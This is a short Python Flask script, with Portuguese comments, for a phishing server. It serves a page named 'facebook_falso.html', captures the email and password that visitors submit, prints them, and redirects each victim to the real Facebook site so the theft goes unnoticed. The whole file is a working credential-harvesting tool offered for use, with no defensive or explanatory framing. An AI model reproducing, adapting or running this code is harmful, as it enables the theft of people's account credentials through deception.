from flask import Flask, render_template, request, redirect

#primeiro instale o flask(pip install flask)
app = Flask(__name__)

@app.route("/")
def pagina_inicial():
    return render_template("facebook_falso.html")

@app.route("/pega_dados", methods=["POST"])
def pega_dads():
    email = request.form.get("email")
    senha = request.form.get("pass")

    print(f"EMAIL: {email} \n SENHA: {senha}")

    return redirect("https://www.facebook.com/?locale=pt_BR")


app.run(host="0.0.0.0",port="8080")